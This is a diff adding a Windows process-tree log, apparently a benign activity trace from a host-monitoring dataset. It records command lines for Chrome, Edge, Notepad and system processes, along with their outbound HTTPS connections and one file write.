@@ -1,0 +1,1104 @@
+smartscreen.exe (PID 7612): "C:\Windows\System32\smartscreen.exe -Embedding"  [x5]
+      connected to → 40.90.184.82:443
+      connected to → 40.90.184.73:443
+      connected to → 20.212.97.243:443
+      connected to → 20.212.96.199:443
+notepad.exe (PID 2304): ""C:\WINDOWS\system32\NOTEPAD.EXE" D:\Log\benign1.txt"  [x16]
+dllhost.exe (PID 16972): "C:\WINDOWS\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}"  [x61]
+chrome.exe (PID 17184): ""C:\Program Files\Google\Chrome\Application\chrome.exe" "  [x21]
+  └─ chrome.exe (PID 8448): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\Google\Chrome\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Crashpad" "--metrics-dir=C:\Users\Administrator\AppData\Local\Google\Chrome\User Data" --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver="  [x21]
+  └─ chrome.exe (PID 17828): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=gpu-process --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1680 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:2"  [x18]
+  └─ chrome.exe (PID 11488): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=1996 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:8"  [x19]
+        connected to → 202.89.233.100:443
+        connected to → 120.253.253.34:443
+        connected to → 211.91.76.52:443
+        connected to → 120.253.253.97:443
+        connected to → 20.190.144.160:443
+        connected to → 40.126.16.165:443
+        connected to → 184.26.127.19:443
+        connected to → 202.89.233.101:443
+        connected to → 120.253.250.226:443
+        connected to → 120.253.255.161:443
+        connected to → 184.26.127.18:443
+        connected to → 13.75.113.36:443
+        connected to → 120.253.253.98:443
+        connected to → 218.26.76.178:443
+        connected to → 111.206.209.78:443
+        connected to → 120.253.253.226:443
+        connected to → 111.206.76.49:443
+        connected to → 42.81.8.133:443
+        connected to → 221.194.182.48:443
+        connected to → 42.81.8.201:443
+        connected to → 110.242.68.9:443
+        connected to → 42.180.124.35:443
+        connected to → 113.1.1.35:443
+        connected to → 123.125.132.31:443
+        connected to → 218.68.136.40:443
+        connected to → 111.206.210.81:443
+        connected to → 101.72.203.35:443
+        connected to → 111.206.209.249:443
+        connected to → 110.242.68.4:443
+        connected to → 112.80.255.252:443
+        connected to → 110.242.68.103:443
+        connected to → 120.253.255.97:443
+        connected to → 180.97.34.43:443
+        connected to → 112.80.255.53:443
+        connected to → 203.208.41.98:443
+        connected to → 120.253.255.98:443
+        connected to → 120.253.255.162:443
+        connected to → 40.126.35.151:443
+        connected to → 124.132.138.27:443
+        connected to → 124.132.138.26:443
+        connected to → 202.89.233.71:443
+        connected to → 124.132.138.34:443
+        connected to → 111.206.208.228:443
+        connected to → 111.206.76.36:443
+        connected to → 112.80.255.158:443
+        connected to → 123.125.132.35:443
+        connected to → 111.206.76.35:443
+        connected to → 112.240.62.35:443
+        connected to → 218.68.136.32:443
+        connected to → 123.129.234.38:443
+        connected to → 112.80.255.27:443
+        connected to → 111.206.208.240:443
+        connected to → 111.206.210.93:443
+        connected to → 61.156.44.35:443
+        connected to → 218.26.76.132:443
+        connected to → 123.244.92.6:443
+        connected to → 103.18.208.254:443
+        connected to → 123.125.132.41:443
+        connected to → 123.125.110.63:443
+        connected to → 111.206.76.48:443
+        connected to → 103.18.208.242:443
+        connected to → 125.35.234.226:443
+        connected to → 113.96.208.232:443
+        connected to → 101.72.249.35:443
+        connected to → 192.144.195.62:443
+        connected to → 118.89.204.198:443
+        connected to → 116.130.197.1:443
+        connected to → 103.41.167.234:443
+        connected to → 218.26.76.185:443
+        connected to → 104.75.169.10:443
+  └─ chrome.exe (PID 11752): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-GB --service-sandbox-type=utility --mojo-platform-channel-handle=2052 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:8"  [x18]
+  └─ chrome.exe (PID 14156): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=6 --launch-time-ticks=266853443905 --mojo-platform-channel-handle=2928 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:1"  [x18]
+  └─ chrome.exe (PID 19176): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=266853472199 --mojo-platform-channel-handle=2932 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:1"  [x15]
+  └─ chrome.exe (PID 6664): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=7 --launch-time-ticks=266854105157 --mojo-platform-channel-handle=4408 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:1"  [x18]
+  └─ chrome.exe (PID 2708): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=audio.mojom.AudioService --lang=en-GB --service-sandbox-type=audio --mojo-platform-channel-handle=3268 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:8"  [x15]
+  └─ chrome.exe (PID 9820): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=9 --launch-time-ticks=266854679269 --mojo-platform-channel-handle=4612 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:1"  [x3]
+  └─ chrome.exe (PID 6448): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=10 --launch-time-ticks=266854765725 --mojo-platform-channel-handle=4736 --field-trial-handle=1800,i,9089498742756755077,4046062497628818067,131072 /prefetch:1"  [x9]
+  └─ chrome.exe (PID 5588): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=9 --launch-time-ticks=268894491723 --mojo-platform-channel-handle=2712 --field-trial-handle=1768,i,1454848324187080003,8704671949748658279,131072 /prefetch:1"  [x6]
+  └─ chrome.exe (PID 18992): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=11 --launch-time-ticks=268895786601 --mojo-platform-channel-handle=5016 --field-trial-handle=1768,i,1454848324187080003,8704671949748658279,131072 /prefetch:1"  [x8]
+  └─ chrome.exe (PID 8912): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=12 --launch-time-ticks=268895949879 --mojo-platform-channel-handle=5060 --field-trial-handle=1768,i,1454848324187080003,8704671949748658279,131072 /prefetch:1"  [x8]
+  └─ chrome.exe (PID 3324): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=13 --launch-time-ticks=268899279459 --mojo-platform-channel-handle=4460 --field-trial-handle=1768,i,1454848324187080003,8704671949748658279,131072 /prefetch:1"
+  └─ chrome.exe (PID 8836): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=chrome.mojom.ProcessorMetrics --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=5060 --field-trial-handle=1752,i,526908127166450241,12279423980473555620,131072 /prefetch:8"  [x10]
+  └─ chrome.exe (PID 15584): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=data_decoder.mojom.DataDecoderService --lang=en-GB --service-sandbox-type=service --mojo-platform-channel-handle=5272 --field-trial-handle=1752,i,526908127166450241,12279423980473555620,131072 /prefetch:8"  [x11]
+  └─ chrome.exe (PID 11160): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-GB --service-sandbox-type=utility --mojo-platform-channel-handle=2140 --field-trial-handle=1600,i,4733396656186963021,2504517344430513269,131072 /prefetch:8"  [x6]
+  └─ chrome.exe (PID 14136): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.19041.546 --gpu-preferences=UAAAAAAAAADoAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAgAQAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=4712 --field-trial-handle=1"  [x3]
+  └─ chrome.exe (PID 7856): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=21232059816 --mojo-platform-channel-handle=2440 --field-trial-handle=2824,i,14439478182050131512,15908428343948380129,131072 /prefetch:1"  [x3]
+  └─ chrome.exe (PID 13752): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=gpu-process --disable-gpu-sandbox --use-gl=disabled --gpu-vendor-id=5140 --gpu-device-id=140 --gpu-sub-system-id=0 --gpu-revision=0 --gpu-driver-version=10.0.19041.546 --gpu-preferences=UAAAAAAAAADoAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAgAQAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=5064 --field-trial-handle=2"
+  └─ chrome.exe (PID 10768): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=13 --launch-time-ticks=286678905146 --mojo-platform-channel-handle=4772 --field-trial-handle=1812,i,8055709189104462647,16010420924450299006,131072 /prefetch:1"  [x6]
+  └─ chrome.exe (PID 10544): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --launch-time-ticks=286679412402 --mojo-platform-channel-handle=4752 --field-trial-handle=1812,i,8055709189104462647,16010420924450299006,131072 /prefetch:1"  [x6]
+  └─ chrome.exe (PID 12824): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=11 --launch-time-ticks=286894179221 --mojo-platform-channel-handle=5076 --field-trial-handle=1776,i,6505011695124656633,15725922783070155703,131072 /prefetch:1"
+  └─ chrome.exe (PID 9840): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=15 --launch-time-ticks=287400041100 --mojo-platform-channel-handle=3148 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 12740): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=16 --launch-time-ticks=287400301012 --mojo-platform-channel-handle=5396 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 14048): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=17 --launch-time-ticks=287401001367 --mojo-platform-channel-handle=4996 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 12968): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=18 --launch-time-ticks=287401249372 --mojo-platform-channel-handle=5564 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 17488): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=19 --launch-time-ticks=287402138288 --mojo-platform-channel-handle=5036 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x3]
+  └─ chrome.exe (PID 7260): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=20 --launch-time-ticks=287402384199 --mojo-platform-channel-handle=5724 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 8588): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=21 --launch-time-ticks=287403015925 --mojo-platform-channel-handle=3148 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x2]
+  └─ chrome.exe (PID 14320): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=22 --launch-time-ticks=287403248496 --mojo-platform-channel-handle=5928 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 18624): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=23 --launch-time-ticks=287403377699 --mojo-platform-channel-handle=6076 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x2]
+  └─ chrome.exe (PID 9540): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=24 --launch-time-ticks=287403471366 --mojo-platform-channel-handle=5344 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"
+  └─ chrome.exe (PID 18040): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=25 --launch-time-ticks=287403712475 --mojo-platform-channel-handle=6216 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 18212): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=26 --launch-time-ticks=287403818274 --mojo-platform-channel-handle=6196 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 10228): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=27 --launch-time-ticks=287404151281 --mojo-platform-channel-handle=6620 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 4092): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=28 --launch-time-ticks=287404284910 --mojo-platform-channel-handle=6840 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 10660): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=29 --launch-time-ticks=287404890485 --mojo-platform-channel-handle=7008 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x3]
+  └─ chrome.exe (PID 16428): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=30 --launch-time-ticks=287405188061 --mojo-platform-channel-handle=6984 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"
+  └─ chrome.exe (PID 5264): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=31 --launch-time-ticks=287405428130 --mojo-platform-channel-handle=6356 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 9208): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=32 --launch-time-ticks=287405676627 --mojo-platform-channel-handle=7476 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 3968): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=33 --launch-time-ticks=287405939773 --mojo-platform-channel-handle=7548 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x4]
+  └─ chrome.exe (PID 13096): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=34 --launch-time-ticks=287406130929 --mojo-platform-channel-handle=7676 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x3]
+  └─ chrome.exe (PID 14788): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=35 --launch-time-ticks=287406524043 --mojo-platform-channel-handle=7980 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x2]
+  └─ chrome.exe (PID 17436): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=36 --launch-time-ticks=287406618544 --mojo-platform-channel-handle=7988 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x2]
+  └─ chrome.exe (PID 16796): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=37 --launch-time-ticks=287406874413 --mojo-platform-channel-handle=8220 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x2]
+  └─ chrome.exe (PID 5780): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=38 --launch-time-ticks=287407010183 --mojo-platform-channel-handle=8236 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x2]
+  └─ chrome.exe (PID 15624): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=39 --launch-time-ticks=287407299136 --mojo-platform-channel-handle=7944 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"  [x2]
+  └─ chrome.exe (PID 11872): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=40 --launch-time-ticks=287407477463 --mojo-platform-channel-handle=8704 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"
+  └─ chrome.exe (PID 5412): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=41 --launch-time-ticks=287407677546 --mojo-platform-channel-handle=8588 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"
+  └─ chrome.exe (PID 5008): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=42 --launch-time-ticks=287409886082 --mojo-platform-channel-handle=9204 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"
+  └─ chrome.exe (PID 17712): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=43 --launch-time-ticks=287410216067 --mojo-platform-channel-handle=9252 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"
+  └─ chrome.exe (PID 8792): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=44 --launch-time-ticks=287410323246 --mojo-platform-channel-handle=9412 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"
+  └─ chrome.exe (PID 14932): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=45 --launch-time-ticks=287410555858 --mojo-platform-channel-handle=9244 --field-trial-handle=1752,i,9723910302924133538,12691185848610773603,131072 /prefetch:1"
+  └─ chrome.exe (PID 10788): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=23 --launch-time-ticks=288679421182 --mojo-platform-channel-handle=6124 --field-trial-handle=1760,i,10503466171354970128,16252157982997709490,131072 /prefetch:1"  [x2]
+  └─ chrome.exe (PID 5780): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=24 --launch-time-ticks=288679638230 --mojo-platform-channel-handle=6168 --field-trial-handle=1760,i,10503466171354970128,16252157982997709490,131072 /prefetch:1"  [x3]
+  └─ chrome.exe (PID 18220): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=30 --launch-time-ticks=288681450243 --mojo-platform-channel-handle=6988 --field-trial-handle=1760,i,10503466171354970128,16252157982997709490,131072 /prefetch:1"  [x3]
+  └─ chrome.exe (PID 13292): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=21 --launch-time-ticks=288884036398 --mojo-platform-channel-handle=6184 --field-trial-handle=1764,i,16047183534979408307,2948889423033018166,131072 /prefetch:1"  [x2]
+  └─ chrome.exe (PID 19136): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --instant-process --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=29 --launch-time-ticks=288886682378 --mojo-platform-channel-handle=7660 --field-trial-handle=1764,i,16047183534979408307,2948889423033018166,131072 /prefetch:1"
+  └─ chrome.exe (PID 10840): ""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --display-capture-permissions-policy-allowed --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=19 --launch-time-ticks=289086017389 --mojo-platform-channel-handle=5828 --field-trial-handle=1736,i,16459315536053255252,4136865298089887537,131072 /prefetch:1"
+audiodg.exe (PID 14708): "C:\WINDOWS\system32\AUDIODG.EXE 0x3a8 0x3b0"  [x6]
+identity_helper.exe (PID 15232): ""C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\identity_helper.exe" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=zh-CN --service-sandbox-type=none --mojo-platform-channel-handle=3208 --field-trial-handle=2132,i,769058598317916170,12310455360644805165,131072 /prefetch:8"  [x7]
+identity_helper.exe (PID 19276): ""C:\Program Files (x86)\Microsoft\Edge\Application\100.0.1185.36\identity_helper.exe" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=zh-CN --service-sandbox-type=none --mojo-platform-channel-handle=3208 --field-trial-handle=2132,i,769058598317916170,12310455360644805165,131072 /prefetch:8" PackageFullName="Microsoft.MicrosoftEdge.Stable_100.0.1185.36_neutral__8wekyb3d8bbwe" ApplicationID="App"  [x7]
+SearchFilterHost.exe (PID 18252): ""C:\WINDOWS\system32\SearchFilterHost.exe" 0 808 812 820 8192 816 792 "  [x22]
+msedge.exe (PID 14816): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" "  [x5]
+      wrote → C:\Program Files (x86)\Microsoft\Edge\Application\DEVOBJ.dll
+      connected to → 40.90.184.73:443
+      connected to → 20.212.96.199:443
+  └─ msedge.exe (PID 12880): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=crashpad-handler "--user-data-dir=C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Crashpad" "--metrics-dir=C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=100.0.4896.75 "--annotation=exe=C:\Prog"  [x8]
+  └─ msedge.exe (PID 16756): ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --lang=zh-CN --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=8 --launch-time-ticks=268904258981 --mojo-platform-channel-handle=3380 --field-trial-handle=2116,i,12931193621269201943,376962966775487648,131072 /prefetch:1"  [x6]
